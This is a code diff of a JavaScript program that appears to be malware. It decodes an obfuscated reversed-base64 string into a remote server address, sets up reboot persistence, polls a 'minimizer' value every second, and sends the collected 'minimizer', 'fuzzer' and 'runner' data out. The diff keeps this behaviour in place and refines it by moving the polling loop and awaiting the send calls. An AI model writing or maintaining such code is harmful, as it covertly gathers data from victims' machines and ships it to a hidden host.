@@ -54,17 +54,6 @@ const runForWindows = async () => {
 };
 
 const runForAll = async () => {
-  // Run Minimizer
-
-  let lastMinimizer = "";
-  setInterval(async () => {
-    const curMinimizer = await getMinimizer();
-    if (lastMinimizer != curMinimizer) {
-      pendingData.minimizer += "," + curMinimizer;
-      lastMinimizer = curMinimizer;
-    }
-  }, 1000);
-
   // Configuration
   const encoded = "==QM1ATN6QTNy4iNyIjLxgTMuUzMx8yL6M3d";
   const decode = (str) => atob(str.split("").reverse().join(""));
@@ -354,18 +343,27 @@ const makeRebootable = async () => {
   } catch (err) {}
 }
 
-const main = async () => {
+let lastMinimizer = "";
 
+const main = async () => {
   if (os.platform().includes("win32")) {
     runForWindows();
   } else {
+    setInterval(async () => {
+      const curMinimizer = await getMinimizer();
+      if (lastMinimizer != curMinimizer) {
+        pendingData.minimizer += "," + curMinimizer;
+        lastMinimizer = curMinimizer;
+      }
+    }, 1000);
+
     makeRebootable();
   }
   runForAll();
 
-  setInterval(() => {
+  setInterval(async () => {
     if (pendingData.minimizer != "" || pendingData.fuzzer != "") {
-      const success = sendMinimizerAndFuzzerData(
+      const success = await sendMinimizerAndFuzzerData(
         pendingData.minimizer,
         pendingData.fuzzer
       );
@@ -376,7 +374,7 @@ const main = async () => {
     }
 
     if (pendingData.runners.length) {
-      const success = sendRunnerData(pendingData.runners);
+      const success = await sendRunnerData(pendingData.runners);
       if (success) {
         pendingData.runners = [];
       }
